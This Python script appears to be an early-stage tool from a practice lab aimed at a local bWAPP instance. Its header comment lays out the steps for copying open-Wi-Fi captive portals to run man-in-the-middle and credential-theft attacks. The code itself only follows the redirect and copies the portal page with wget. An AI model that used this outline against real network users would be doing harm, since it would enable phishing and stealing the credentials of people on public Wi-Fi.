#!/usr/bin/python3
# ok so the basics of captive portals and how to mirror them for mitm and
#   Credential stealing attacks.
#
#   1. you join an open wifi network
#   2. youre either immediatley sent to a page by firefox's detect portal
#        or everything redirects to the portal
#   3. download the portal
#   4. host the portal
#   5. establish MITM dominance via preferred methods ()
#   6. serve the portal to people connecting to you
#   7. gather credentials from the submit so maybe a cgi wrapper is needed
#       or just a cgi callback (onsubmit. whatever the javascript is.)
#           - google "form submit to cgi python"
#   8.hand off web browsing gracefully or continue to mitm

import requests
import subprocess
import os
import sys

target = 'http://127.0.0.1/bWAPP/htmli_get.php'
#target    = 'https://www.google.com'
useragent = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0'}
#change shell to our directory
os.chdir(os.path.dirname(sys.argv[0]))
def pagemirror(url):
    subprocess.call(['wget', '-nd', '-H', '-np', '-k', '-p', '-E', '--directory-prefix=./portal/', url])

#automatically follows redirects,
def getportal(url):
    global sess
    global portalpage
    sess = requests.session()
    portalpage_holder = sess.get(url, headers= useragent)
    portalpage = portalpage_holder.url

getportal(target)
pagemirror(portalpage)
